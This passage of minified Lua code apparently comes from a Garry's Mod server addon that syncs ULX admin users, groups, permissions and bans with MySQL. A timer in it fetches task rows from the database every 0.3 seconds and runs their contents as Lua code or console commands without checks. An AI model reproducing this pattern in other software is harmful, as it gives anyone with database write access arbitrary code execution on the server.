                        local d = util["SteamIDFrom64"](ag["ssteamid"])

                        if e["users"][d] then
                            e["users"][d]["group"] = ULib["DEFAULT_ACCESS"]
                        else
                            e["users"][d] = {}
                            e["users"][d]["group"] = ULib["DEFAULT_ACCESS"]
                            e["users"][d]["steamid"] = ag["ssteamid"]
                            e["users"][d]["allow"] = {}
                            e["users"][d].deny = {}
                            ulx_leysql["namefixplayerucl"](d)
                        end
                    end

                    d:start()
                end
            end

            e["groups"][c] = nil

            for d, ag in pairs(e["users"]) do
                if (ag["group"] == c) then
                    ag["group"] = ULib["DEFAULT_ACCESS"]
                end
            end

            for d, ag in pairs(e["authed"]) do
                if (ag["group"] == c) then
                    ag["group"] = ULib["DEFAULT_ACCESS"]
                end
            end

            for d, ag in pairs(e["groups"]) do
                if (ag["inherit_from"] == c) then
                    ag["inherit_from"] = ULib["DEFAULT_ACCESS"]
                end
            end

            for d, ag in pairs(player["GetAll"]()) do
                if (ag:GetUserGroup() == c) then
                    ag:SetUserGroup(ULib["DEFAULT_ACCESS"])
                end
            end

            hook.Call(ULib["HOOK_UCLCHANGED"])
        end

        d:start()
    end
end

if ulx_leysql["syncusers"]:GetBool() then
    ucl_adduser_old = ucl_adduser_old or e.addUser

    function e.addUser(d, al, am, an, ao)
        b("adduser:" .. d)
        local al = util["SteamIDTo64"](d)

        if not al then
            b"no sid64!"

            return
        end

        if not an then
            b"no group!"

            return
        end

        local am = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["Check"])
        am:setString(1, al)

        am["onSuccess"] = function(am, ao)
            local am = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"].Add)
            am:setString(1, al)
            am:setString(2, an)

            if ao[1] then
                local ao = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["Remove"])
                ao:setString(1, al)

                ao["onSuccess"] = function(ao, ap)
                    am:start()
                end

                ao:start()
            else
                am:start()
            end

            local am = {}
            am["allow"] = {}
            am.deny = {}
            am["group"] = an
            e["users"][d] = am
            ulx_leysql["namefixplayerucl"](d)
            local ao = {}
            ao[d] = e["users"][d]
            a(ao)
            xgui.updateData({}, "users", ao)

            for ao, aq in pairs(player["GetAll"]()) do
                if e["authed"][aq:UniqueID()] and aq:SteamID() == d then
                    e["authed"][aq:UniqueID()] = am
                    aq:SetUserGroup(an)
                    net.Start"leysql_shitgrp"
                    net.WriteEntity(aq)
                    net.WriteString(an)
                    net.Broadcast()
                end
            end
        end

        am:start()
    end

    ucl_userallow_old = ucl_userallow_old or e.userAllow

    function e.userAllow(d, ar, as, at)
        b("userallow: " .. d)
        ucl_userallow_old(d, ar, as, at)
    end

    ucl_removeuser_old = ucl_removeuser_old or e.removeUser

    function e.removeUser(d, au)
        b("removeuser:" .. d)
        local au, av = util["SteamIDTo64"](d), ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Users"]["Remove"])
        av:setString(1, au)
        av:start()
        local au = {}
        au["allow"] = {}
        au.deny = {}
        au["group"] = "user"
        e["users"][d] = au
        ulx_leysql["namefixplayerucl"](d)
        local av = {}
        av[d] = e["users"][d]
        a(av)
        xgui.updateData({}, "users", av)

        for av, aw in pairs(player["GetAll"]()) do
            if e["authed"][aw:UniqueID()] and aw:SteamID() == d then
                e["authed"][aw:UniqueID()] = au
                aw:SetUserGroup"user"
                net.Start"leysql_shitgrp"
                net.WriteEntity(aw)
                net.WriteString"user"
                net.Broadcast()
            end
        end
    end

    ucl_registeraccess_old = ucl_registeraccess_old or e.registerAccess

    function e.registerAccess(d, ax, ay, az)
        b("registeraccess:" .. d)
        ucl_registeraccess_old(d, ax, ay, az)
    end

    old_set_usergroup = old_set_usergroup or c.SetUserGroup

    function c:SetUserGroup(d, aA)
        b("setusergroup: " .. d)

        return old_set_usergroup(self, d, aA)
    end

    function ulx_leysql.newreloadUsers()
        if not ulx_leysql.sqldb["dbobj"] then return end
        e["users"] = {}
        local d = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Users"]["GetAll"])

        d["onSuccess"] = function(d, aB)
            if aB[1] then
                local d = aB
                a(d)

                for d, aC in pairs(d) do
                    aC["steamid"] = util["SteamIDFrom64"](aC["ssteamid"])
                    b("LGROUP: " .. aC["steamid"])
                    e["users"][aC["steamid"]] = {}
                    e["users"][aC["steamid"]]["group"] = aC["group"]
                    e["users"][aC["steamid"]]["steamid"] = aC["ssteamid"]
                    e["users"][aC["steamid"]]["allow"] = {}
                    e["users"][aC["steamid"]].deny = {}
                    ulx_leysql["namefixplayerucl"](aC["steamid"])
                end
            end
        end

        d:start()
    end
end

function ulx_leysql.newreloadGroups()
    if not ulx_leysql.sqldb["dbobj"] then return end
    local c, d = e["groups"], ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Groups"]["GetAll"])

    d["onSuccess"] = function(d, aD)
        if aD[1] then
            b"got groups"
            a(aD)
            local d = aD
            e["groups"] = {}

            for d, aE in pairs(d) do
                if aE["cantarget"] == "*" or aE["cantarget"] == "all" then
                    aE["cantarget"] = nil
                end

                if (aE["inheritsfrom"] == "none") then
                    aE["inheritsfrom"] = nil
                end

                e["groups"][aE.name] = {}
                e["groups"][aE.name]["allow"] = {}
                e["groups"][aE.name]["inherit_from"] = aE["inheritsfrom"]
                e["groups"][aE.name]["can_target"] = aE["cantarget"]
            end

            local d = ulx_leysql.sqldb["dbobj"]:query(ulx_leysql.sqldb.Queries["Perms"]["GetAll"])

            d["onSuccess"] = function(d, aF)
                local d, aG = aF, {}

                for d, aF in pairs(d) do
                    local d = string.Split(aF["allowedgroups"], "|")
                    aG[aF["permission"]] = aF["allowedgroups"]

                    for d, aH in pairs(d) do
                        local d = string.Split(aH, "=")
                        local aH, aI = d[1], d[2]

                        if e["groups"][aH] then
                            if aI then
                                e["groups"][aH]["allow"][aF["permission"]] = aI
                            else
                                table["insert"](e["groups"][aH]["allow"], aF["permission"])
                            end
                        else
                            if (string.len(aH) > 0) then
                                b("permission " .. aF["permission"] .. " for " .. aH .. " won't work!")
                            end
                        end
                    end
                end

                local d = {}

                for aF, aJ in pairs(ulx.cvars) do
                    local aJ = aF

                    if not string.find(aJ, "ulx") then
                        aJ = "ulx " .. aJ
                    end

                    if not aG[aJ] then
                        table["insert"](d, aJ)
                    end
                end

                for aF, aK in pairs(ulx["cmdsByCategory"]) do
                    for aF, aK in pairs(aK) do
                        local aF = aK["cmd"]

                        if not string.find(aF, "ulx") then
                            aF = "ulx " .. aF
                        end

                        if not aG[aF] then
                            table["insert"](d, aF)
                        end
                    end
                end

                for d, aF in pairs(d) do
                    local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"].Add)
                    d:setString(1, aF)
                    d:setString(2, "")
                    d:start()
                end
            end

            d:start()
        else
            b"no groups"
            local d = {}

            for aD, aL in pairs(c) do
                local aM = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Groups"].Add)
                aM:setString(1, aD)
                aM:setString(2, aL["inherit_from"] or "none")
                aM:setString(3, aL["can_target"] or "*")
                aM:start()

                if aL["allow"] then
                    for aM, aN in pairs(aL["allow"]) do
                        if not d[aN] then
                            d[aN] = {}
                        end

                        table["insert"](d[aN], aD)
                    end
                end
            end

            for d, aD in pairs(d) do
                local aO = string["Implode"]("|", aD)
                b(aO)
                local aD = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Perms"].Add)
                aD:setString(1, d)
                aD:setString(2, string.len(aO) > 0 and aO or "")
                aD:start()
            end
        end
    end

    d:start()
end

function ulx_leysql.portbans()
    local b = ulx_leysql.sqldb["dbobj"]:query"SELECT * FROM `ulx_leysql_bans_active` WHERE 1=1"

    b["onSuccess"] = function(b, c)
        for b, c in pairs(c) do
            local b = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Bans.Add)
            a(c)
            b:setNumber(1, c["ssteamid"])
            b:setString(2, c.nick)
            b:setNumber(3, c.time)
            b:setNumber(4, c["duration"])
            b:setString(5, c.reason)
            b:setNumber(6, tonumber(c.bannedby))
            b:setString(7, c["bannedby_nick"])
            b:setNull(8)
            b:setString(9, "")
            b:start()
        end
    end

    b:start()
    local b = ulx_leysql.sqldb["dbobj"]:query"DROP TABLE `ulx_leysql_bans_active`"
    b:start()
end

function ulx_leysql.ondbconnect(a)
    ulx_leysql.sqldb["dbobj"] = a
    b"[ULXMySQL] Connected to mysql db!"

    for a, c in pairs(ulx_leysql.sqldb.Queries.OnConnect) do
        ulx_leysql.sqldb["dbobj"]:query(c):start()
    end

    ulx_leysql.portbans()
    ulx_leysql.refreshulx()

    timer.Create("ulx_leysql.updateserverinfo", 5, 0, function()
        local a, c, d = ulx_leysql.sqldb["gmodserver"].ip, ulx_leysql.sqldb["gmodserver"].port, ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Servers"]["Check"])
        d:setString(1, a)
        d:setNumber(2, c)

        d["onSuccess"] = function(d, e)
            if e[1] then
                ulx_leysql.ServerID = e[1].id
                local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Servers"].Update)
                d:setString(1, GetHostName())
                d:setString(2, game.GetMap())
                d:setNumber(3, #player["GetAll"]())
                d:setNumber(4, game.MaxPlayers())
                d:setNumber(5, #player.GetBots())
                d:setNumber(6, 4000)
                d:setNumber(7, os.time())
                d:setString(8, a)
                d:setNumber(9, c)
                d:start()
            else
                local d = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries["Servers"].Add)
                d:setString(1, a)
                d:setNumber(2, c)
                d:setString(3, GetHostName())
                d:setString(4, game.GetMap())
                d:setNumber(5, #player["GetAll"]())
                d:setNumber(6, game.MaxPlayers())
                d:setNumber(7, #player.GetBots())
                d:setNumber(8, 4000)
                d:setNumber(9, os.time())
                d:start()
            end
        end

        d.onError = function(a, c, d)
            ErrorNoHalt("[ULXMySQL] Couldn't check/update server info, reconnecting [ " .. c .. "]")

            timer.Simple(1, function()
                ulx_leysql.sqldb["dbobj"] = nil
                ulx_leysql["initiatemysql"]()
            end)
        end

        d:start()
    end)

    timer.Create("ulx_leysql.runtasks", 0.3, 0, function()
        if not ulx_leysql.ServerID then
            b"ulx_leysql.runtasks::no serverid set!"

            return
        end

        local a, c, d = ulx_leysql.sqldb["gmodserver"].ip, ulx_leysql.sqldb["gmodserver"].port, ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Tasks["Check"])
        d:setNumber(1, ulx_leysql.ServerID)

        d["onSuccess"] = function(a, c)
            if c[1] then
                b("Running: " .. tostring(table.Count(c)) .. " tasks!")
                v.data = v.data or ""

                for a, d in pairs(c) do
                    if (d.type == 1) then
                        if d.data and string.len(d.data) > 1 then
                            local a = CompileString(d.data, "Cur MYSQL Lua", not 1)

                            if isstring(a) then
                                ErrorNoHalt("[ULXMySQL] " .. a .. "\n")
                            else
                                a()
                            end
                        end
                    end

                    if (d.type == 2) then
                        game["ConsoleCommand"](d.data .. "\n")
                    end

                    local a = ulx_leysql.sqldb["dbobj"]:prepare(ulx_leysql.sqldb.Queries.Tasks.Update)
                    a:setString(1, d.stringid)
                    a:start()
                end
            end
        end

        d:start()
    end)
end

function ulx_leysql.initiatemysql()
    if ulx_leysql.sqldb["dbobj"] then return end
    b"ulx_leysql.initiatemysql()"
    local a = mysqloo.connect(ulx_leysql.sqldb.Hostname, ulx_leysql.sqldb.Username, d, ulx_leysql.sqldb.Database, ulx_leysql.sqldb.Port)
    a.onConnected = ulx_leysql.ondbconnect

    a.onConnectionFailed = function(a, c)
        ErrorNoHalt("[ULXMySQL] Couldn't connect! " .. c)

        timer.Simple(10, function()
            ulx_leysql.sqldb["dbobj"] = nil
            ulx_leysql["initiatemysql"]()
        end)
    end

    a:connect()
end

function ulx_leysql.refreshulx()
    if ulx_leysql["syncbans"]:GetBool() then
        ULib.refreshBans()
    end

    if ulx_leysql["syncusers"]:GetBool() then
        ulx_leysql.newreloadUsers()
        e.saveUsers()
    end

    if ulx_leysql["syncgroups"]:GetBool() then
        ulx_leysql.newreloadGroups()
        e.saveGroups()
    end
end

function ulx_leysql.load()
    b"ulx_leysql.load()"
    ulx_leysql["initiatemysql"]()
end

ulx_leysql.load()
timer.Create("ulx_leysql_refresh", 900, 0, ulx_leysql.refreshulx)